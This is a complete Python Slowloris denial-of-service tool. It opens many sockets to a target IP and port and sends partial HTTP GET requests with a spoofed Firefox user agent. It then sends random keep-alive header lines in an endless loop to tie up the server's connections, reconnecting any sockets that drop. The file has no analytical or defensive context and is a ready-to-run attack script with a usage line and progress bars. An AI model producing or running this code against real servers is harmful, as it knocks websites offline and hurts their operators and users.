#!/usr/bin/env python3
# -*- coding: utf-8 -*-
from socket import socket, AF_INET, SOCK_STREAM, error
from random import randint
from time import sleep
from sys import argv, exit
from progress.counter import Counter, Countdown
from progress.bar import PixelBar
from ANSI import *

version = ' 0.2'
headers = ["User-agent: Mozilla/5.0 (Windows NT 6.3; rv:36.0) Gecko/20100101 Firefox/36.0", "Accept-language: en-US,en,q=0.5"]

with open('ascii.txt') as file:
  loris = file.read()
print(SCREENC, loris, '\nversion:'+version,'\n')

def init(ip, port):
  soc = socket(AF_INET, SOCK_STREAM)
  soc.settimeout(4)
  soc.connect((ip, int(port)))
  soc.send('GET /?{} HTTP/1.1\r\n'.format(randint(0,2400)).encode('utf-8'))
  for header in headers: soc.send('{}\r\n'.format(header).encode('utf-8'))
  return soc

if __name__ == '__main__':
  if len(argv)<5:
    exit(REDC+"Usage: {} ip port count time".format(argv[0]))
  ip = argv[1]
  port = argv[2]
  count = int(argv[3])
  timer = int(argv[4])
  socketList = []

  bar = Counter(GREENC+'Creating sockets: '+YELLOWC, max=count)
  for _ in range(count):
    try: soc=init(ip, port)
    except error: break
    socketList.append(soc)
    bar.next()

  print()
  while True:
    sendbar = PixelBar(GREYC+'Sending keep-alive Headers'+REDC, max=timer)
    
    for soc in socketList:
      try: soc.send('X-a {}\r\n'.format(randint(1,4800)).encode('utf-8'))
      except error: socketList.remove(soc)

    for _ in range(count - len(socketList)):
      try: 
        soc=init(ip, port)
        if soc: socketList.append(soc)
      except error: break
    
    for t in range(timer):
      sleep(1); sendbar.next()
    sendbar.start()